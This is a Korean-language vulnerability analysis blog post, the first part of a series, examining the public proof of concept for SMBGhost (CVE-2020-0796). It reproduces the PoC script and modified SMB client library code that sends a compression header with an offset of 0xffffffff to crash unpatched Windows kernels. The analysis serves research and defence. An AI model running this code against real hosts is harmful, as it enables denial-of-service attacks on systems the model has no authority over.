---
title: SMBGhost(CVE-2020-0796) Analysis -1-
keywords: documentation, Vulnerability, SMB, CVE 
date: 2020-03-26
tags: [Windows, Reversing, CVE, Vulnerability, Kernel]
summary: "SMBGhost(CVE-2020-0796) 분석(1)"
sidebar: vuln_sidebar
permalink: vuln_smb_analysis.html
folder: vuln

---

## [0x00] Overview

우선 분석을 위해 실제 커널에서 충돌을 일으킬 수 있는 PoC 코드를 확인하였습니다.

-  https://github.com/eerykitty/CVE-2020-0796-POC

<img src="https://github.com/Shhoya/shhoya.github.io/blob/master/rsrc/smbghost/smb_03.png?raw=true">

넌 페이지드 영역에서 페이지 폴트가 발생하여 버그 체크가 발생했습니다. 즉 유효하지 않은 주소에 접근을 하여 버그체크가 발생했습니다. 아래에서 PoC 코드 내용을 분석해보겠습니다.



## [0x01] PoC Script Analysis

해당 코드를 열어보면 `smbclient` 모듈을 이용합니다.

```python
#!/usr/bin/env python3

from smbclient import (
    link,
    open_file,
    remove,
    register_session,
    stat,
    symlink,
)

import sys

if len(sys.argv) < 2:
    print("usage: ./CVE-2020-0796.py servername")
    sys.exit(1)

register_session(sys.argv[1], username="fakeusername",
    password="password", encrypt=False) # encryption must be disabled

```

`register_session` 함수는 `smbclient` 내 `_pool.py` 에 정의되어 있습니다.

```python
def register_session(server, username=None, password=None, port=445, encrypt=None, connection_timeout=60):
    """
    Creates an active connection and session to the server specified. This can be manually called to register the
    credentials of a specific server instead of defining it on the first function connecting to the server. The opened
    connection is registered in a pool and re-used if a connection is made to the same server with the same
    credentials.

    :param server: The server name to register.
    :param username: Optional username to connect with. Required if no session has been registered for the server and
        Kerberos auth is not being used.
    :param password: Optional password to connect with.
    :param port: The port to connect with.
    :param encrypt: Whether to force encryption or not, once this has been set to True the session cannot be changed
        back to False.
    :param connection_timeout: Override the timeout used for the initial connection.
    :return: The Session that was registered or already existed in the pool.
    """
    connection_key = "%s:%s" % (server, port)

    global _SMB_CONNECTIONS
    connection = _SMB_CONNECTIONS.get(connection_key, None)

    if not connection:
        connection = Connection(_CLIENT_GUID, server, port)
        connection.connect(timeout=connection_timeout)
        _SMB_CONNECTIONS[connection_key] = connection

    # Find the first session in the connection session list that match the username specified, if not username then
    # just use the first session found or fall back to creating a new one with implicit auth/kerberos.
    session = next((s for s in connection.session_table.values() if username is None or s.username == username), None)
    if not session:
        session = Session(connection, username=username, password=password, require_encryption=(encrypt is True))
        session.connect()
    elif encrypt is not None:
        # We cannot go from encryption to no encryption on an existing session but we can do the opposite.
        if session.encrypt_data and not encrypt:
            raise ValueError("Cannot disable encryption on an already negotiated session.")
        elif not session.encrypt_data and encrypt:
            session.encrypt = True

    return session
```

위와 같은 코드로 정의되어 있으며, `session.py` 내부에 `connect()` 를 따라 추적하면 `connection.py` 내에 `_send` 함수를 만날 수 있습니다.

```python
def _send(self, messages, session_id=None, tree_id=None, message_id=None, credit_request=None, related=False,
              async_id=None):
        send_data = b""
        requests = []
        session = self.session_table.get(session_id, None)
        tree = None
        if tree_id and session:
            if tree_id not in session.tree_connect_table:
                raise SMBException("Cannot find Tree with the ID %d in the session tree table" % tree_id)
            tree = session.tree_connect_table[tree_id]

        total_requests = len(messages)
        for i, message in enumerate(messages):
            if i == total_requests - 1:
                next_command = 0
                padding = b""
            else:
                # each compound message must start at the 8-byte boundary
                msg_length = 64 + len(message)
                mod = msg_length % 8
                padding_length = 8 - mod if mod > 0 else 0
                next_command = msg_length + padding_length
                padding = b"\x00" * padding_length

            # When running with multiple threads we need to ensure that getting the message id and adjusting the
            # sequence windows is done in a thread safe manner so we use a lock to ensure only 1 thread accesses the
            # sequence window at a time.
            with self.sequence_lock:
                sequence_window_low = self.sequence_window['low']
                sequence_window_high = self.sequence_window['high']
                credit_charge = self._calculate_credit_charge(message)
                credits_available = sequence_window_high - sequence_window_low
                if credit_charge > credits_available:
                    raise SMBException("Request requires %d credits but only %d credits are available"
                                       % (credit_charge, credits_available))

                current_id = message_id or sequence_window_low
                if message.COMMAND != Commands.SMB2_CANCEL:
                    self.sequence_window['low'] += credit_charge if credit_charge > 0 else 1

            if async_id is None:
                header = SMB2HeaderRequest()
                header['tree_id'] = tree_id or 0
            else:
                header = SMB2HeaderAsync()
                header['flags'].set_flag(Smb2Flags.SMB2_FLAGS_ASYNC_COMMAND)
                header['async_id'] = async_id

            header['credit_charge'] = credit_charge
            header['command'] = message.COMMAND
            header['credit_request'] = credit_request if credit_request else credit_charge
            header['message_id'] = current_id
            header['session_id'] = session_id or 0
            header['data'] = message.pack()
            header['next_command'] = next_command

            if i != 0 and related:
                header['session_id'] = b"\xff" * 8
                header['tree_id'] = b"\xff" * 4
                header['flags'].set_flag(Smb2Flags.SMB2_FLAGS_RELATED_OPERATIONS)

            if session and session.signing_required and session.signing_key:
                header['flags'].set_flag(Smb2Flags.SMB2_FLAGS_SIGNED)
                b_header = header.pack() + padding
                signature = self._generate_signature(b_header, session.signing_key)

                # To save on unpacking and re-packing, manually adjust the signature and update the request object for
                # back-referencing.
                b_header = b_header[:48] + signature + b_header[64:]
                header['signature'] = signature
            else:
                b_header = header.pack() + padding

            send_data += b_header

            if message.COMMAND == Commands.SMB2_CANCEL:
                request = self.outstanding_requests[header['message_id'].get_value()]
            else:
                request = Request(header, type(message), self, session_id=session_id)
                self.outstanding_requests[header['message_id'].get_value()] = request

            requests.append(request)

        if related:
            requests[0].related_ids = [r.message['message_id'].get_value() for r in requests][1:]

        global g_count
        g_count += 1
        if g_count == 3: # send the bad offset after the server asks for creds
            send_data = self._compress(send_data, session)
        if session and session.encrypt_data or tree and tree.encrypt_data:
            send_data = self._encrypt(send_data, session)

        self.transport.send(send_data)
        return requests
```

하단의 코드를 살펴보면 제작자가 `g_count` 라는 전역변수를 통해 조건을 설정해두었고 세션을 맺으면 `_compress` 함수를 호출 후 패킷을 전달합니다.

```python
def _compress(self, b_data, session):
        header = SMB2CompressionTransformHeader()
        header['original_size'] = len(b_data)
        header['offset'] = 4294967295
        header['data'] = smbprotocol.lznt1.compress(b_data)

        return header
```

위와 같은 코드로 이루어져있으며, 제작자는 오프셋의 값을 4294967295(0xffffffff)으로 설정하여 전송합니다. 약간의 코드를 수정하여 다음과 같은 패킷을 볼 수 있습니다.

<img src="https://github.com/Shhoya/shhoya.github.io/blob/master/rsrc/smbghost/smb_04.png?raw=true">

본격적으로 커널단에서 어떻게 동작하는지 확인하도록 하겠습니다. 전체 패킷은 아래에 있습니다.

<img src="https://github.com/Shhoya/shhoya.github.io/blob/master/rsrc/smbghost/smb_05.png?raw=true">